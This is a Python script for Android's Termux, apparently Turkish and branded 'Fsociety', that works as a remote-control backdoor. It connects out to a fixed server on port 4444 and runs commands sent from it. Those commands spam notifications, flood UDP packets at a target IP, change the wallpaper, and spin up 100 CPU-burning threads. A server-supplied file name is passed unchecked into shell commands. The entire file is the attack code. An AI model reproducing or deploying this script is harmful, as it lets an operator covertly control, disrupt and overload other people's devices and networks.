
import socket
import os
import time
import threading

try:
    import termux
except ImportError:
    os.system("pip install termux")

def bildirim_spam():
    for i in range(10):
        os.system(f'termux-notification --title "Fsociety" --content "Bildirim {i+1}"')
        time.sleep(0.5)

def udp_spam():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hedef_ip = "192.168.1.100"
    hedef_port = 80
    mesaj = b"Fsociety UDP Spam"
    for _ in range(100):
        sock.sendto(mesaj, (hedef_ip, hedef_port))

def arka_plan_degistir(dosya_adi):
    tam_yol = f"/sdcard/Download/{dosya_adi}"
    if os.path.exists(tam_yol):
        os.system(f"termux-wallpaper -f {tam_yol}")
        os.system('termux-toast -b green "Duvar kaÄŸÄ±dÄ± ayarlandÄ±"')
    else:
        os.system('termux-toast -b red "Dosya bulunamadÄ±"')

def yuk_bindir():
    def yÃ¼k():
        while True:
            pass
    for _ in range(100):
        threading.Thread(target=yÃ¼k, daemon=True).start()

host = "192.168.1.100"  # Server IP
port = 4444             # Sabit port

s = socket.socket()
s.connect((host, port))
print(f"[+] BaÄŸlandÄ±: {host}:{port}")

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut == "exit":
            break
        elif komut == "bildirim-spam":
            bildirim_spam()
            s.send("[âœ“] Bildirim spam gÃ¶nderildi.".encode())
        elif komut == "udp-spam":
            udp_spam()
            s.send("[âœ“] UDP paketleri gÃ¶nderildi.".encode())
        elif komut.startswith("arka-plan "):
            dosya_adi = komut.split(" ", 1)[1]
            arka_plan_degistir(dosya_adi)
            s.send("[âœ“] Duvar kaÄŸÄ±dÄ± deÄŸiÅŸtirildi.".encode())
        elif komut == "yÃ¼kle":
            yuk_bindir()
            s.send("[âœ“] YÃ¼kleme baÅŸlatÄ±ldÄ±.".encode())
        else:
            s.send("[X] Bilinmeyen komut.".encode())
    except Exception as e:
        os.system(f'termux-toast -b red "{str(e)}"')
        break

s.close()
